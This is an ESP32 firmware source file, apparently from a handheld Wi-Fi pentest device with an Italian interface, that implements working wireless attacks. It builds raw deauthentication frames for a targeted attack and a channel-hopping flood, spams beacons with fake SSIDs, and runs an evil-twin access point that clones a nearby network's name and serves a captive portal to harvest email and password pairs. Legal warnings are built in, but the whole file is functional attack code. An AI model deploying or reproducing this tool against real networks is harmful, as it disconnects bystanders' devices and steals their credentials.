#include <algorithm>
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

#include <esp_err.h>
#include <esp_http_server.h>
#include <esp_netif.h>
#include <esp_random.h>
#include <esp_timer.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/semphr.h>

#include "Display.h"
#include "MenuManager.h"
#include "Navigation.h"
#include "Ui.h"
#include "WifiInternal.h"
#include "orbit_compat.h"
#include "orbit_mascot/Mascot.h"
#include "orbit_store/Store.h"

namespace orbit_wifi {
namespace {

constexpr uint32_t kAttackMs = 60000;
constexpr uint32_t kPortalMaxMs = 600000;
constexpr int kMaxCredentials = 4;
constexpr int kMaxFormBytes = 1024;

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

std::string fmt(const char* format, ...) {
    char buffer[128];
    va_list args;
    va_start(args, format);
    std::vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    return std::string(buffer);
}

void secureZero(void* data, size_t len) {
    volatile uint8_t* bytes = static_cast<volatile uint8_t*>(data);
    while (len-- > 0) {
        *bytes++ = 0;
    }
}

void fillRandomBssid(uint8_t mac[6]) {
    esp_fill_random(mac, 6);
    mac[0] = static_cast<uint8_t>((mac[0] | 0x02) & 0xFE);
}

void buildDeauth(uint8_t frame[26], const uint8_t bssid[6], const uint8_t destination[6],
                 uint16_t sequence) {
    frame[0] = 0xC0;  // deauth
    frame[1] = 0x00;
    frame[2] = 0x00;  // duration
    frame[3] = 0x00;
    std::memcpy(frame + 4, destination, 6);
    std::memcpy(frame + 10, bssid, 6);
    std::memcpy(frame + 16, bssid, 6);
    const uint16_t control = static_cast<uint16_t>((sequence & 0x0FFF) << 4);
    frame[22] = static_cast<uint8_t>(control & 0xFF);
    frame[23] = static_cast<uint8_t>(control >> 8);
    frame[24] = 7;  // reason: class 3 frame from nonassociated station
    frame[25] = 0;
}

size_t buildBeacon(uint8_t* out, const uint8_t mac[6], const char* ssid, size_t ssidLen,
                   uint8_t channel, uint16_t sequence) {
    if (ssidLen > 32) {
        ssidLen = 32;
    }
    out[0] = 0x80;  // beacon
    out[1] = 0x00;
    out[2] = 0x00;
    out[3] = 0x00;
    std::memcpy(out + 4, kBroadcast, 6);
    std::memcpy(out + 10, mac, 6);
    std::memcpy(out + 16, mac, 6);
    const uint16_t control = static_cast<uint16_t>((sequence & 0x0FFF) << 4);
    out[22] = static_cast<uint8_t>(control & 0xFF);
    out[23] = static_cast<uint8_t>(control >> 8);

    const uint64_t timestamp = static_cast<uint64_t>(esp_timer_get_time());
    for (int i = 0; i < 8; ++i) {
        out[24 + i] = static_cast<uint8_t>((timestamp >> (8 * i)) & 0xFF);
    }
    out[32] = 100;  // beacon interval 100 TU
    out[33] = 0;
    out[34] = 0x21;  // capability: ESS + short preamble + short slot
    out[35] = 0x04;

    size_t index = 36;
    out[index++] = 0;  // SSID
    out[index++] = static_cast<uint8_t>(ssidLen);
    if (ssidLen > 0) {
        std::memcpy(out + index, ssid, ssidLen);
        index += ssidLen;
    }
    const uint8_t rates[] = {0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};
    out[index++] = 1;  // supported rates
    out[index++] = static_cast<uint8_t>(sizeof(rates));
    std::memcpy(out + index, rates, sizeof(rates));
    index += sizeof(rates);
    out[index++] = 3;  // DS parameter
    out[index++] = 1;
    out[index++] = channel;
    return index;
}

void drawScanning(const char* parent) {
    ui::drawScreen("Radar WiFi", parent,
                   {"Scansione attiva canali 1-13", "Attendi 1-2 secondi."}, "attendi");
}

int chooseBeaconSeconds() {
    constexpr uint32_t kOptions[] = {30, 60, 120};
    constexpr const char* kLabels[] = {"30 secondi", "60 secondi", "120 secondi"};
    int selected = 1;
    navigation::waitRelease();
    for (;;) {
        display::clear(display::C(display::T_bg));
        display::header("Durata beacon", "WiFi Attacks");
        for (int i = 0; i < 3; ++i) {
            const int y = 34 + i * 22;
            if (i == selected) {
                display::g().fillRoundRect(4, y - 3, display::width() - 8, 20, 3,
                                           display::C(display::T_bg3));
                display::g().drawRect(4, y - 3, display::width() - 8, 20,
                                      display::C(display::T_err));
            }
            const std::string label = (i == selected ? "> " : "  ") + std::string(kLabels[i]);
            display::text(12, y, label,
                          i == selected ? display::C(display::T_hi) : display::C(display::T_text),
                          2);
        }
        display::text(8, 104, "1..13 canali, SSID falsi", display::C(display::T_warn), 0);
        display::footer(";.=scegli  ENTER=avvia  `=annulla");
        display::push();

        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            return -1;
        }
        if (ev.type == navigation::Event::Select) {
            return static_cast<int>(kOptions[selected]);
        }
        if (ev.type == navigation::Event::Up || ev.type == navigation::Event::Left) {
            selected = (selected + 2) % 3;
        } else if (ev.type == navigation::Event::Down || ev.type == navigation::Event::Right) {
            selected = (selected + 1) % 3;
        }
        delay(30);
    }
}

// --- Portale: credenziali solo in RAM, mai su SD o NVS. ---

struct Credential {
    char email[64];
    char password[64];
};

Credential g_credentials[kMaxCredentials];
int g_credentialCount = 0;
SemaphoreHandle_t g_credentialMutex = nullptr;

bool ensureCredentialMutex() {
    if (g_credentialMutex == nullptr) {
        g_credentialMutex = xSemaphoreCreateMutex();
    }
    return g_credentialMutex != nullptr;
}

int credentialCount() {
    if (g_credentialMutex == nullptr) {
        return 0;
    }
    if (xSemaphoreTake(g_credentialMutex, pdMS_TO_TICKS(100)) != pdTRUE) {
        return 0;
    }
    const int count = g_credentialCount;
    xSemaphoreGive(g_credentialMutex);
    return count;
}

void credentialClear() {
    if (g_credentialMutex == nullptr) {
        return;
    }
    if (xSemaphoreTake(g_credentialMutex, pdMS_TO_TICKS(500)) != pdTRUE) {
        return;
    }
    secureZero(g_credentials, sizeof(g_credentials));
    g_credentialCount = 0;
    xSemaphoreGive(g_credentialMutex);
}

int credentialTakeAll(Credential out[kMaxCredentials]) {
    if (g_credentialMutex == nullptr) {
        return 0;
    }
    if (xSemaphoreTake(g_credentialMutex, pdMS_TO_TICKS(500)) != pdTRUE) {
        return 0;
    }
    int count = g_credentialCount;
    if (count < 0) {
        count = 0;
    }
    if (count > kMaxCredentials) {
        count = kMaxCredentials;
    }
    std::memcpy(out, g_credentials, sizeof(Credential) * static_cast<size_t>(count));
    secureZero(g_credentials, sizeof(g_credentials));
    g_credentialCount = 0;
    xSemaphoreGive(g_credentialMutex);
    return count;
}

void storeCredential(const char* email, const char* password) {
    if (g_credentialMutex == nullptr) {
        return;
    }
    if (xSemaphoreTake(g_credentialMutex, pdMS_TO_TICKS(200)) != pdTRUE) {
        return;
    }
    if (g_credentialCount < kMaxCredentials) {
        Credential& slot = g_credentials[g_credentialCount];
        std::memset(&slot, 0, sizeof(slot));
        std::strncpy(slot.email, email, sizeof(slot.email) - 1);
        std::strncpy(slot.password, password, sizeof(slot.password) - 1);
        ++g_credentialCount;
    }
    xSemaphoreGive(g_credentialMutex);
}

int hexValue(char c) {
    if (c >= '0' && c <= '9') {
        return c - '0';
    }
    if (c >= 'a' && c <= 'f') {
        return c - 'a' + 10;
    }
    if (c >= 'A' && c <= 'F') {
        return c - 'A' + 10;
    }
    return -1;
}

void urlDecode(const char* source, size_t len, char* out, size_t capacity) {
    size_t written = 0;
    for (size_t i = 0; i < len && written + 1 < capacity; ++i) {
        char c = source[i];
        if (c == '+') {
            c = ' ';
        } else if (c == '%' && i + 2 < len) {
            const int high = hexValue(source[i + 1]);
            const int low = hexValue(source[i + 2]);
            if (high >= 0 && low >= 0) {
                c = static_cast<char>((high << 4) | low);
                i += 2;
            }
        }
        if (c == '\0') {
            break;
        }
        out[written++] = c;
    }
    out[written] = '\0';
}

void parseFormField(const char* body, size_t len, const char* key, char* out, size_t capacity) {
    const size_t keyLen = std::strlen(key);
    size_t start = 0;
    while (start < len) {
        size_t end = start;
        while (end < len && body[end] != '&') {
            ++end;
        }
        if (end - start > keyLen && std::strncmp(body + start, key, keyLen) == 0 &&
            body[start + keyLen] == '=') {
            urlDecode(body + start + keyLen + 1, end - start - keyLen - 1, out, capacity);
            return;
        }
        start = end + 1;
    }
}

const char kPortalHtml[] =
    "<!doctype html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Accesso WiFi</title><style>"
    "body{background:#101010;color:#eee;font-family:sans-serif;margin:0}"
    ".c{max-width:360px;margin:40px auto;padding:20px;background:#1b1b1b;"
    "border:1px solid #333;border-radius:8px}"
    "h2{margin:0 0 10px;color:#e8b23a}label{font-size:13px;color:#aaa}"
    "input{width:100%;box-sizing:border-box;padding:10px;margin:6px 0 14px;"
    "background:#222;color:#eee;border:1px solid #444;border-radius:4px}"
    "button{width:100%;padding:11px;background:#2f6f4f;color:#fff;border:0;"
    "border-radius:4px;font-size:15px}small{color:#888}</style></head><body>"
    "<div class='c'><h2>Accesso WiFi</h2>"
    "<p><small>Solo test su reti proprie o autorizzate.</small></p>"
    "<form method='POST' action='/post'>"
    "<label>Email</label><input name='email' type='email' maxlength='63' "
    "autocomplete='off' required>"
    "<label>Password</label><input name='password' type='password' maxlength='63' required>"
    "<button type='submit'>Connetti</button></form>"
    "<p><small>Dati in RAM, nessun log.</small></p></div></body></html>";

const char kSubmittedHtml[] =
    "<!doctype html><html><head><meta charset='utf-8'><title>OK</title></head>"
    "<body style='background:#101010;color:#eee;font-family:sans-serif;"
    "text-align:center;padding-top:60px'>"
    "<h2>Connessione in corso</h2><p>Attendi la verifica dei dati.</p>"
    "</body></html>";

esp_err_t portalGet(httpd_req_t* request) {
    if (std::strcmp(request->uri, "/") == 0) {
        httpd_resp_set_type(request, "text/html");
        httpd_resp_set_hdr(request, "Cache-Control", "no-store");
        return httpd_resp_sendstr(request, kPortalHtml);
    }
    httpd_resp_set_status(request, "302 Found");
    httpd_resp_set_hdr(request, "Location", "/");
    return httpd_resp_send(request, nullptr, 0);
}

esp_err_t portalPost(httpd_req_t* request) {
    if (request->content_len == 0 || request->content_len > kMaxFormBytes) {
        httpd_resp_send_err(request, HTTPD_413_CONTENT_TOO_LARGE, "Richiesta troppo grande");
        return ESP_OK;
    }

    char* body = static_cast<char*>(std::malloc(request->content_len + 1));
    if (body == nullptr) {
        httpd_resp_send_500(request);
        return ESP_OK;
    }

    size_t total = 0;
    int timeouts = 0;
    while (total < request->content_len) {
        const int received =
            httpd_req_recv(request, body + total, request->content_len - total);
        if (received == HTTPD_SOCK_ERR_TIMEOUT) {
            if (++timeouts > 3) {
                break;
            }
            continue;
        }
        if (received <= 0) {
            break;
        }
        total += static_cast<size_t>(received);
    }
    body[total] = '\0';

    if (total == 0 || total != request->content_len) {
        secureZero(body, request->content_len + 1);
        std::free(body);
        httpd_resp_send_err(request, HTTPD_400_BAD_REQUEST, "Richiesta non valida");
        return ESP_OK;
    }

    char email[64] = {};
    char password[64] = {};
    parseFormField(body, total, "email", email, sizeof(email));
    if (email[0] == '\0') {
        parseFormField(body, total, "username", email, sizeof(email));
    }
    parseFormField(body, total, "password", password, sizeof(password));
    if (password[0] != '\0') {
        storeCredential(email, password);
    }

    secureZero(body, request->content_len + 1);
    std::free(body);
    secureZero(email, sizeof(email));
    secureZero(password, sizeof(password));

    httpd_resp_set_type(request, "text/html");
    return httpd_resp_sendstr(request, kSubmittedHtml);
}

void showCapturedCredentials() {
    Credential captured[kMaxCredentials] = {};
    const int count = credentialTakeAll(captured);

    if (count == 0) {
        ui::message("Portale chiuso", {"Nessun dato inviato.", "Nessun log o file creato."},
                    "WiFi Attacks");
    } else {
        std::vector<std::string> lines;
        lines.reserve(static_cast<size_t>(count) * 2);
        for (int i = 0; i < count; ++i) {
            const std::string email =
                captured[i].email[0] != '\0' ? std::string(captured[i].email) : std::string("-");
            lines.push_back(fmt("%d) %s", i + 1, shortText(email, 30).c_str()));
            lines.push_back("   pw: " + shortText(captured[i].password, 28));
        }
        ui::message(fmt("Portale chiuso (%d)", count), lines, "WiFi Attacks",
                    "solo RAM - ora cancellate");
        for (std::string& line : lines) {
            secureZero(line.data(), line.size());
        }
    }
    secureZero(captured, sizeof(captured));
}

}  // namespace

// --- Attacchi ---

void runDeauthTarget() {
    drawScanning("WiFi Attacks");
    std::vector<Network> networks;
    if (!scanNetworks(networks)) {
        ui::message("Deauth", {"!Scansione non riuscita."}, "WiFi Attacks");
        return;
    }
    if (networks.empty()) {
        ui::message("Deauth", {"Nessuna rete trovata."}, "WiFi Attacks");
        return;
    }

    MenuManager menu("Target deauth", "WiFi Attacks");
    for (size_t i = 0; i < networks.size(); ++i) {
        const Network network = networks[i];
        menu.addItem(networkLabel(network), "jammer", [network] { attackDeauth(network); });
    }
    menu.setHint("ENTER=avvia  `=indietro");
    menu.run(true);
}

void runDeauthFlood() {
    drawScanning("WiFi Attacks");
    std::vector<Network> networks;
    if (!scanNetworks(networks)) {
        ui::message("Deauth flood", {"!Scansione non riuscita."}, "WiFi Attacks");
        return;
    }
    if (!ui::legalWarning("Deauth Flood", {"Colpisce tutte le reti visibili in banda."},
                          "WiFi Attacks")) {
        return;
    }
    if (!radioBeginSta()) {
        ui::message("Deauth flood", {"!Radio non avviabile."}, "WiFi Attacks");
        return;
    }

    uint8_t frame[26];
    uint8_t currentChannel = 1;
    uint32_t sequence = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
    int failRun = 0;
    bool blocked = false;
    const uint32_t start = millis();
    uint32_t lastDraw = start - 1000;

    navigation::waitRelease();
    while (millis() - start < kAttackMs) {
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }

        for (uint8_t channel = 1; channel <= kChannelCount; ++channel) {
            if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
                continue;
            }
            currentChannel = channel;

            // Deauth broadcast generico: copre anche BSSID non osservati.
            uint8_t randomBssid[6];
            fillRandomBssid(randomBssid);
            buildDeauth(frame, randomBssid, kBroadcast, static_cast<uint16_t>(sequence++));
            if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) {
                ++sent;
                failRun = 0;
            } else {
                ++failed;
                if (++failRun >= 20) {
                    blocked = true;
                    break;
                }
            }
            delay(2);

            for (const Network& network : networks) {
                if (network.channel != channel) {
                    continue;
                }
                buildDeauth(frame, network.bssid, kBroadcast,
                            static_cast<uint16_t>(sequence++));
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) {
                    ++sent;
                    failRun = 0;
                } else {
                    ++failed;
                    if (++failRun >= 20) {
                        blocked = true;
                        break;
                    }
                }
                delay(2);
            }
            if (blocked) {
                break;
            }
        }
        if (blocked) {
            break;
        }

        const uint32_t now = millis();
        if (now - lastDraw >= 300) {
            lastDraw = now;
            ui::drawScreen(
                "Deauth flood", "WiFi Attacks",
                {fmt("Target osservati: %u", static_cast<unsigned>(networks.size())),
                 fmt("Canale: %u", static_cast<unsigned>(currentChannel)),
                 fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                 fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                 fmt("Tempo: %us / 60s", static_cast<unsigned>((now - start) / 1000)),
                 "!Disconnette i client in range."},
                "ESC = interrompi", display::C(display::T_err));
        }
        delay(5);
    }

    const uint32_t elapsed = (millis() - start) / 1000;
    radioStop();
    std::vector<std::string> lines = {fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                                      fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                                      fmt("Durata: %us", static_cast<unsigned>(elapsed))};
    if (blocked) {
        lines.push_back("!TX rifiutato: IDF 5.4 blocca i deauth.");
    }
    ui::message("Deauth flood", lines, "WiFi Attacks");
    if (sent > 0) {
        mascot::award(mascot::Event::WifiDeauthFlood);
    }
}

void runBeaconSpam() {
    const int seconds = chooseBeaconSeconds();
    if (seconds < 0) {
        return;
    }
    if (!ui::legalWarning("Beacon Spam", {"Trasmette beacon con SSID falsi."},
                          "WiFi Attacks")) {
        return;
    }
    if (!radioBeginSta()) {
        ui::message("Beacon spam", {"!Radio non avviabile."}, "WiFi Attacks");
        return;
    }

    const char* const names[] = {"Free WiFi",    "Guest Network", "Airport WiFi",
                                 "Hotel Guest",  "Casa",          "MiFi",
                                 "AndroidAP",    "iPhone",        "Printer Setup",
                                 "IoT-Device",   "Test Network",  "WiFi Gratis",
                                 "Rete Ospiti",  "DIRECT-00",     "Smart Home",
                                 "Coffee Shop"};
    constexpr size_t kNameCount = sizeof(names) / sizeof(names[0]);

    uint8_t frame[128];
    uint8_t currentChannel = 1;
    uint32_t frameIndex = 0;
    uint32_t sequence = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
    int failRun = 0;
    bool blocked = false;
    const uint32_t durationMs = static_cast<uint32_t>(seconds) * 1000U;
    const uint32_t start = millis();
    uint32_t lastDraw = start - 1000;

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    navigation::waitRelease();
    while (millis() - start < durationMs) {
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }

        const uint8_t channel = static_cast<uint8_t>((frameIndex % kChannelCount) + 1);
        if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
            currentChannel = channel;
        }
        const char* name = names[frameIndex % kNameCount];
        uint8_t mac[6];
        fillRandomBssid(mac);
        const size_t length = buildBeacon(frame, mac, name, std::strlen(name), currentChannel,
                                          static_cast<uint16_t>(sequence++));
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, length, false) == ESP_OK) {
            ++sent;
            failRun = 0;
        } else {
            ++failed;
            if (++failRun >= 20) {
                blocked = true;
                break;
            }
        }
        ++frameIndex;

        const uint32_t now = millis();
        if (now - lastDraw >= 300) {
            lastDraw = now;
            ui::drawScreen(
                "Beacon spam", "WiFi Attacks",
                {"SSID: " + shortText(std::string(name), 22),
                 fmt("Canale: %u", static_cast<unsigned>(currentChannel)),
                 fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                 fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                 fmt("Tempo: %us / %ds", static_cast<unsigned>((now - start) / 1000), seconds),
                 "!SSID falsi: solo test RF isolati."},
                "ESC = interrompi", display::C(display::T_err));
        }
        delay(100);
    }

    const uint32_t elapsed = (millis() - start) / 1000;
    radioStop();
    std::vector<std::string> lines = {fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                                      fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                                      fmt("Durata: %us", static_cast<unsigned>(elapsed))};
    if (blocked) {
        lines.push_back("!TX rifiutato dal driver (canale/regione).");
    }
    ui::message("Beacon spam", lines, "WiFi Attacks");
    if (sent > 0) {
        mascot::award(mascot::Event::WifiBeacon);
    }
}

void portalOne(const Network& target) {
    if (!ui::legalWarning("Evil Twin + Portal", {"Crea un AP aperto con SSID clonato."},
                          "WiFi Attacks")) {
        return;
    }
    if (!orbit_store::wifiEnsureDriver()) {
        ui::message("Evil twin", {"!Driver WiFi non disponibile."}, "WiFi Attacks");
        return;
    }

    esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (apNetif == nullptr) {
        apNetif = esp_netif_create_default_wifi_ap();
    }
    if (apNetif == nullptr) {
        ui::message("Evil twin", {"!Interfaccia AP non creata."}, "WiFi Attacks");
        return;
    }

    const std::string ssid =
        target.ssid.empty() ? std::string("WiFi_Test") : target.ssid.substr(0, 32);
    uint8_t activeChannel = clampChannel(target.channel);

    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_stop();
    const bool modeOk = esp_wifi_set_mode(WIFI_MODE_AP) == ESP_OK;
    esp_err_t err = ESP_FAIL;
    if (modeOk) {
        configureCountry();
        wifi_config_t config = {};
        std::memcpy(config.ap.ssid, ssid.data(), ssid.size());
        config.ap.ssid_len = static_cast<uint8_t>(ssid.size());
        config.ap.channel = activeChannel;
        config.ap.authmode = WIFI_AUTH_OPEN;
        config.ap.max_connection = 4;
        config.ap.beacon_interval = 100;
        err = esp_wifi_set_config(WIFI_IF_AP, &config);
        if (err == ESP_OK) {
            err = esp_wifi_start();
        }
        // Alcuni domini regolatori non permettono il canale scelto.
        if (err != ESP_OK && activeChannel != 6) {
            esp_wifi_stop();
            activeChannel = 6;
            config.ap.channel = activeChannel;
            err = esp_wifi_set_config(WIFI_IF_AP, &config);
            if (err == ESP_OK) {
                err = esp_wifi_start();
            }
        }
    }
    if (err != ESP_OK) {
        radioStop();
        ui::message("Evil twin", {"!Access point non avviato.", esp_err_to_name(err)},
                    "WiFi Attacks");
        return;
    }

    esp_netif_ip_info_t ipInfo = {};
    for (int i = 0; i < 20; ++i) {
        if (esp_netif_get_ip_info(apNetif, &ipInfo) == ESP_OK && ipInfo.ip.addr != 0) {
            break;
        }
        delay(50);
    }
    char ipText[16] = "192.168.4.1";
    if (ipInfo.ip.addr != 0) {
        esp_ip4addr_ntoa(&ipInfo.ip, ipText, sizeof(ipText));
    }

    if (!ensureCredentialMutex()) {
        radioStop();
        ui::message("Evil twin", {"!Memoria per le credenziali non disponibile."},
                    "WiFi Attacks");
        return;
    }
    credentialClear();

    httpd_config_t httpConfig = HTTPD_DEFAULT_CONFIG();
    httpConfig.server_port = 80;
    httpConfig.max_uri_handlers = 3;
    httpConfig.max_open_sockets = 7;
    httpConfig.lru_purge_enable = true;
    httpConfig.uri_match_fn = httpd_uri_match_wildcard;
    httpConfig.stack_size = 6144;
    httpConfig.recv_wait_timeout = 1;

    httpd_handle_t server = nullptr;
    if (httpd_start(&server, &httpConfig) != ESP_OK) {
        radioStop();
        ui::message("Evil twin", {"!Server HTTP non avviato."}, "WiFi Attacks");
        return;
    }
    const httpd_uri_t getUri = {"/*", HTTP_GET, portalGet, nullptr};
    const httpd_uri_t postUri = {"/post", HTTP_POST, portalPost, nullptr};
    if (httpd_register_uri_handler(server, &getUri) != ESP_OK ||
        httpd_register_uri_handler(server, &postUri) != ESP_OK) {
        httpd_stop(server);
        radioStop();
        ui::message("Evil twin", {"!Handler HTTP non registrati."}, "WiFi Attacks");
        return;
    }

    const uint32_t start = millis();
    uint32_t lastDraw = start - 1000;
    navigation::waitRelease();
    while (millis() - start < kPortalMaxMs) {
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }
        const uint32_t now = millis();
        if (now - lastDraw >= 400) {
            lastDraw = now;
            wifi_sta_list_t stations = {};
            int clients = 0;
            if (esp_wifi_ap_get_sta_list(&stations) == ESP_OK) {
                clients = stations.num;
            }
            ui::drawScreen(
                "Evil twin + portal", "WiFi Attacks",
                {"SSID: " + shortText(ssid, 22),
                 fmt("Canale: %u", static_cast<unsigned>(activeChannel)),
                 "IP portale: " + std::string(ipText),
                 fmt("Client AP: %d", clients),
                 fmt("Credenziali: %d/%d", credentialCount(), kMaxCredentials),
                 fmt("Tempo: %us / 600s", static_cast<unsigned>((now - start) / 1000)),
                 "!Dati solo in RAM, mai su SD/NVS."},
                "ESC = chiudi AP", display::C(display::T_err));
        }
        delay(50);
    }

    const bool longEnough = millis() - start >= 10000;
    httpd_stop(server);
    esp_wifi_stop();
    esp_wifi_set_storage(WIFI_STORAGE_FLASH);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    orbit_store::wifiShutdownDriver();
    showCapturedCredentials();
    if (longEnough) {
        mascot::award(mascot::Event::EvilTwin);
    }
}

void runEvilTwinPortal() {
    drawScanning("WiFi Attacks");
    std::vector<Network> networks;
    if (!scanNetworks(networks)) {
        ui::message("Evil twin", {"!Scansione non riuscita."}, "WiFi Attacks");
        return;
    }
    if (networks.empty()) {
        ui::message("Evil twin", {"Nessuna rete trovata."}, "WiFi Attacks");
        return;
    }

    MenuManager menu("SSID da clonare", "WiFi Attacks");
    for (size_t i = 0; i < networks.size(); ++i) {
        const Network network = networks[i];
        menu.addItem(networkLabel(network), "portal",
                     [network] { attackEvilTwinPortal(network); });
    }
    menu.setHint("ENTER=avvia  `=indietro");
    menu.run(true);
}

void attackDeauth(const Network& target) {
    if (!ui::legalWarning("Deauth WiFi", {"Interrompe le sessioni dei client vicini."},
                          "WiFi Attacks")) {
        return;
    }
    if (!radioBeginSta()) {
        ui::message("Deauth", {"!Radio non avviabile."}, "WiFi Attacks");
        return;
    }
    const uint8_t channel = clampChannel(target.channel);
    if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
        radioStop();
        ui::message("Deauth", {"!Canale non disponibile.",
                               fmt("Canale %u", static_cast<unsigned>(channel))},
                    "WiFi Attacks");
        return;
    }

    uint8_t frame[26];
    uint32_t sequence = 0;
    uint32_t sent = 0;
    uint32_t failed = 0;
    int failRun = 0;
    bool blocked = false;
    const uint32_t start = millis();
    uint32_t lastDraw = start - 1000;

    navigation::waitRelease();
    while (millis() - start < kAttackMs) {
        const navigation::EventData ev = navigation::poll();
        if (ev.type == navigation::Event::Back) {
            break;
        }

        buildDeauth(frame, target.bssid, kBroadcast, static_cast<uint16_t>(sequence++));
        if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) == ESP_OK) {
            ++sent;
            failRun = 0;
        } else {
            ++failed;
            if (++failRun >= 20) {
                blocked = true;
                break;
            }
        }

        const uint32_t now = millis();
        if (now - lastDraw >= 250) {
            lastDraw = now;
            ui::drawScreen(
                "Deauth", "WiFi Attacks",
                {"Target: " + shortText(target.ssid.empty() ? std::string("(nascosta)")
                                                            : target.ssid,
                                        20),
                 "BSSID: " + bssidText(target.bssid),
                 fmt("Canale: %u", static_cast<unsigned>(channel)),
                 fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                 fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                 fmt("Tempo: %us / 60s", static_cast<unsigned>((now - start) / 1000)),
                 "!Solo reti proprie o autorizzate."},
                "ESC = interrompi", display::C(display::T_err));
        }
        delay(50);  // circa 20 frame al secondo
    }

    const uint32_t elapsed = (millis() - start) / 1000;
    radioStop();
    std::vector<std::string> lines = {fmt("Frame inviati: %u", static_cast<unsigned>(sent)),
                                      fmt("Errori TX: %u", static_cast<unsigned>(failed)),
                                      fmt("Durata: %us", static_cast<unsigned>(elapsed))};
    if (blocked) {
        lines.push_back("!TX rifiutato: IDF 5.4 blocca i deauth.");
    }
    ui::message("Deauth", lines, "WiFi Attacks");
    if (sent > 0) {
        mascot::award(mascot::Event::WifiDeauth);
    }
}

void attackEvilTwinPortal(const Network& target) {
    portalOne(target);
}

}  // namespace orbit_wifi
